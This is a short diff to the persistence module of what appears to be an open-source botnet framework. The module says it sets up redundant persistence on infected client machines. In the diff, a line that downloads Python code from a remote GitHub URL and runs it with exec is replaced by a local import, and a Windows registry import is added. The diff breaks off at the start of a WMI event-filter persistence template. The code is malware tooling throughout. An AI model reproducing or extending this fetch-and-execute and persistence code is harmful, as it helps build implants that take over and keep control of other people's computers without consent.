@@ -10,10 +10,12 @@ import urllib
 import random
 import subprocess
 
+# packages
+if sys.platform == 'win32':
+    import _winreg
+
 # utilities
-util = imp.new_module('util')
-exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
-sys.modules['util'] = util
+import core.util as util
 
 # globals
 packages = ['_winreg'] if sys.platform == 'win32' else []
@@ -24,10 +26,6 @@ description = """
 Establish persistence on the client host machine 
 with multiple methods to ensure redundancy
 """
-
-# setup
-if util.is_compatible(platforms, __name__):
-    util.imports(packages, globals())
 
 # templates
 __Template_wmi = """$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
